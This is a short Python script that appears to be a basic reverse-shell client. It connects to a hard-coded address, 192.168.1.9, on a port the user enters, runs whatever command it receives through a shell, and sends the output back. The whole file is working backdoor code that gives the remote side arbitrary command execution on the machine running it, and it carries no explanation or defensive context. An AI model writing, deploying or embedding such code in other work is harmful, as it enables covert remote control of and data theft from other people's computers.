import socket
import subprocess


def client(portyy):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('192.168.1.9', portyy))
    data, address = sock.recvfrom(65535)
    command = data.decode('ascii')

    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, \
                            stderr=subprocess.PIPE)

    std_out_val = proc.stdout.read()
    sock.send(std_out_val)


if __name__ == "__main__":
    port = int(input('Enter the port to connect to:'))

    try:
        client(port)
    except:
        print("I'll try again")

